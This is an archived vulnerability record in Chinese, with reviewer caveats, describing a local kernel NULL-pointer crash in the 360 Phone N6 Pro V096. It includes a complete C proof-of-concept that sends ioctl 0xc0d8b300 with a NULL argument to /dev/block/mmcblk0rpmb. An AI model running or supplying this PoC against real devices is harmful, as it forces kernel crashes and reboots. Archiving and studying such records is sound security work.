---
source: "历史归档批(无原始出处标注)"
id: "vw-9bc0b1f7115bbd97d3919fe1"
entity_id: "ve-9bc0b1f7115bbd97d3919fe1"
schema_version: "1"
title: "360 Phone N6 Pro内核漏洞"
product: "360 Phone N6 Pro 1801-A01"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "V096 Android7.1.1 kernel4.4.21，必须能O_RDWR打开并ioctl块设备"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/360/360%20Phone%20N6%20Pro%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "畸形输入可能使进程/内核崩溃、设备重启或服务不可用；本文崩溃线索不自动证明稳定代码执行，需隔离环境和可恢复配置"
source_status: "unknown"
---

# 360 Phone N6 Pro内核漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：360 Phone N6 Pro 1801-A01
- 本文讨论：mmcblk0rpmb ioctl空指针导致崩溃，无编号
- 版本、权限与配置前提：V096 Android7.1.1 kernel4.4.21，必须能O_RDWR打开并ioctl块设备
- 资料类型：Android本地内核DoS PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 正文泛称攻击者却代码明示设备权限，不能普通APP/远程无条件触发
- static command缺显式类型，system/close缺对应头，现代C编译会报错或警告；换行转义丢为n
- 只有崩溃声明无堆栈/补丁/原始出处
- 原始 `static command =` 声明按归档保留；它依赖旧式 C 的隐式类型规则，现代编译器及目标 ABI 的适用性未验证，不据排版修订改变其类型。
- 已落实的文本修订：“#include &lt;stdio.h&gt;”改为“#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;”；“with errno %dn”改为“with errno %d\n”；“payload NULLn”改为“payload NULL\n”；“crash and reboot.n”改为“crash and reboot.\n”；“failed, %dn”改为“failed, %d\n”。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 本例只支持需要设备节点权限的本地内核崩溃线索，不是普通应用或互联网远程 RCE；仅静态修正 C 类型、头文件和换行转义，未编译或执行。

### 操作风险与恢复

- 畸形输入可能使进程/内核崩溃、设备重启或服务不可用；本文崩溃线索不自动证明稳定代码执行，需隔离环境和可恢复配置

### 待核与来源

- 原研究、节点ACL/SELinux、修复及CVE映射待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 一、漏洞简介

360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令**3235427072**在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。

## 二、漏洞影响

- 名称：360 Phone N6 Pro
- 型号：1801-A01
- 安卓版本：7.1.1
- 版本号：V096
- 内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64

## 三、复现过程

### poc

```
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd < 0) {
printf("Failed to open %s, with errno %d\n", driver, errno);
system("echo 1 > /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULL\n", driver, command);
printf("System will crash and reboot.\n");
if(ioctl(fd, command, NULL) < 0) {
printf("Allocation of structs failed, %d\n", errno);
system("echo 2 > /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
}
```